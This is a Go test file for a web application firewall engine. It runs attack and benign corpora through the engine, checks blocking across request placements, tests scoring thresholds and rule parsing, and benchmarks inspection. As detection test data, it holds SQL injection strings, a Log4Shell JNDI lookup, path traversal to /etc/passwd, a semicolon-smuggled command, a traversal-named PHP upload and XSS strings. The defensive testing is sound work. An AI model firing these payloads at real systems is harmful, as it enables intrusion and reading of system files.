package waf

import (
	"bufio"
	"bytes"
	"encoding/json"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func newEngine() *Engine { return NewEngine(Config{}, DefaultRules()) }

func lines(t testing.TB, glob string) []string {
	files, _ := filepath.Glob(glob)
	if len(files) == 0 {
		t.Fatalf("no corpus files match %s", glob)
	}
	var out []string
	for _, f := range files {
		fh, err := os.Open(f)
		if err != nil {
			t.Fatal(err)
		}
		sc := bufio.NewScanner(fh)
		for sc.Scan() {
			if l := strings.TrimRight(sc.Text(), "\r"); strings.TrimSpace(l) != "" {
				out = append(out, l)
			}
		}
		fh.Close()
	}
	return out
}

func inspectQuery(e *Engine, v string) Result {
	r := httptest.NewRequest("GET", "/search?q="+url.QueryEscape(v), nil)
	return e.Inspect(Extract(r, nil))
}

// The corpus is a regression suite: every attack must be blocked and every
// benign line allowed. A detector change that breaks this fails CI.
func TestCorpusAttacksBlocked(t *testing.T) {
	e := newEngine()
	for _, p := range lines(t, "../../eval/corpus/attack/*.txt") {
		if res := inspectQuery(e, p); !res.Blocked {
			t.Errorf("not blocked (score %d): %s", res.Score, p)
		}
	}
}

func TestCorpusBenignAllowed(t *testing.T) {
	e := newEngine()
	for _, p := range lines(t, "../../eval/corpus/benign/*.txt") {
		if res := inspectQuery(e, p); res.Blocked {
			t.Errorf("false positive (score %d, %v): %s", res.Score, res.Findings, p)
		}
	}
}

func TestPlacements(t *testing.T) {
	e := newEngine()
	payload := "' UNION SELECT password FROM users--"

	form := []byte("comment=" + url.QueryEscape(payload))
	r := httptest.NewRequest("POST", "/", bytes.NewReader(form))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if !e.Inspect(Extract(r, form)).Blocked {
		t.Error("form body not blocked")
	}

	js, _ := json.Marshal(map[string]any{"a": map[string]any{"b": []any{1, payload}}})
	r = httptest.NewRequest("POST", "/", bytes.NewReader(js))
	r.Header.Set("Content-Type", "application/json")
	if !e.Inspect(Extract(r, js)).Blocked {
		t.Error("nested JSON not blocked")
	}

	xmlBody := []byte(`<?xml version="1.0"?><order><note>` + "' OR 1=1--" + `</note></order>`)
	r = httptest.NewRequest("POST", "/", bytes.NewReader(xmlBody))
	r.Header.Set("Content-Type", "application/xml")
	if !e.Inspect(Extract(r, xmlBody)).Blocked {
		t.Error("XML body not blocked")
	}

	r = httptest.NewRequest("GET", "/", nil)
	r.Header.Set("Cookie", `session=abc; pref=' or '1'='1`)
	if !e.Inspect(Extract(r, nil)).Blocked {
		t.Error("cookie not blocked (lenient cookie parsing)")
	}

	r = httptest.NewRequest("GET", "/", nil)
	r.Header.Set("X-Api-Version", "${jndi:ldap://x/a}")
	if !e.Inspect(Extract(r, nil)).Blocked {
		t.Error("Log4Shell header not blocked")
	}

	r = httptest.NewRequest("GET", "/static/..%2f..%2f..%2fetc%2fpasswd", nil)
	if !e.Inspect(Extract(r, nil)).Blocked {
		t.Error("path traversal in path not blocked")
	}

	r = httptest.NewRequest("GET", "/search?q=1;id", nil) // ';' makes Go's parser drop the pair
	if !e.Inspect(Extract(r, nil)).Blocked {
		t.Error("semicolon-smuggled query not blocked")
	}

	mp := "--X\r\nContent-Disposition: form-data; name=\"f\"; filename=\"../../probe.php\"\r\n\r\n<?php echo 1; ?>\r\n--X--\r\n"
	r = httptest.NewRequest("POST", "/upload", strings.NewReader(mp))
	r.Header.Set("Content-Type", "multipart/form-data; boundary=X")
	if !e.Inspect(Extract(r, []byte(mp))).Blocked {
		t.Error("malicious upload not blocked")
	}
}

func TestParanoiaAndThreshold(t *testing.T) {
	lenient := NewEngine(Config{Threshold: 100}, DefaultRules())
	if inspectQuery(lenient, "<script>alert(1)</script>").Blocked {
		t.Error("threshold 100 should not block a single XSS")
	}
	if res := inspectQuery(lenient, "<script>alert(1)</script>"); res.Score == 0 {
		t.Error("findings should still be reported below threshold")
	}
}

func TestRuleParsing(t *testing.T) {
	if _, err := ParseRules([]byte(`[{"id":1,"pattern":"("}]`)); err == nil {
		t.Error("invalid regex accepted")
	}
	if _, err := ParseRules([]byte(`[{"id":1,"pattern":"a"},{"id":1,"pattern":"b"}]`)); err == nil {
		t.Error("duplicate id accepted")
	}
}

var (
	benchBenign = []byte(`{"user":{"name":"John O'Brien","email":"john@example.com","bio":"I like rock 'n' roll; cats & dogs"},"items":[{"sku":"A-100","qty":2},{"sku":"B-7","qty":1}],"note":"please deliver after 5pm"}`)
	benchAttack = []byte(`{"user":{"name":"x' UNION SELECT password FROM users--","bio":"<svg/onload=alert(1)>"},"cmd":"; cat /etc/passwd"}`)
)

func benchJSON(b *testing.B, body []byte) {
	e := newEngine()
	r := httptest.NewRequest("POST", "/api/orders?ref=newsletter&utm_source=mail", bytes.NewReader(body))
	r.Header.Set("Content-Type", "application/json")
	r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0")
	r.Header.Set("Cookie", "session=4f9a2c; theme=dark")
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(Extract(r, body))
	}
}

func BenchmarkInspectBenignJSON(b *testing.B) { benchJSON(b, benchBenign) }
func BenchmarkInspectAttackJSON(b *testing.B) { benchJSON(b, benchAttack) }
